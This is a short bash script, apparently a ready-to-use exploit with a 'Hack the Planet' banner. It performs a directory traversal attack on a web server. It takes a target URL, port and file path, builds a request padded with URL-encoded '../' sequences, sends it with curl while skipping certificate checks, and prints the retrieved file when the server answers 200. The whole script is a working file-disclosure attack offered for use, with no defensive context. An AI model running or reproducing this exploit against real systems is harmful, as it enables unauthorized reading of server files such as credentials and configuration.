#!/bin/bash

# Disable warning
export CURL_SSL_BACKEND=openssl

# Function to print ASCII art
ascii() {
    echo "   _  _         _     _   _          ___ _       "
    echo " | || |__ _ __| |__ | |_| |_  ___  | _ \ |__ _ _ _  ___| |_ "
    echo " | __ / _\` / _| / / |  _| ' \/ -_) |  _/ / _\` | ' \/ -_)  _|"
    echo " |_||_\__,_\__|_\_\  \__|_||_\___| |_| |_\__,_|_||_\___|\__|"
}

# Function to exploit
exploit() {
    local targetUrl=$1
    local targetPort=$2
    local targetFile=$3
    local encoded_target_file=$(echo "$targetFile" | sed 's/\//%2F/g')
    local finalUrl="$targetUrl:$targetPort/%2F%2F%2F%2F%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F..$encoded_target_file"

    # Make the GET request
    response=$(curl -s -w "%{http_code}" -k "$finalUrl")
    
    # Extract the HTTP status code (last three characters of the response)
    status_code="${response: -3}"
    
    # Extract the content of the response (all but the last three characters)
    content="${response:0:${#response}-3}"

    # Check if the request was successful
    if [ "$status_code" -eq 200 ]; then
        echo "Request was successful!!!!"
        echo "Response content:"
        echo "$content"
    else
        echo "Target might not be vulnerable..."
        exit 1
    fi
}

# Main function
main() {
    if [ "$#" -ne 6 ]; then
        echo "Usage: $0 -u targetUrl -p targetPort -f targetFile"
        exit 1
    fi

    while getopts "u:p:f:" opt; do
        case $opt in
            u) targetUrl=$OPTARG ;;
            p) targetPort=$OPTARG ;;
            f) targetFile=$OPTARG ;;
            *) echo "Usage: $0 -u targetUrl -p targetPort -f targetFile"
               exit 1 ;;
        esac
    done

    ascii
    exploit "$targetUrl" "$targetPort" "$targetFile"
}

main "$@"
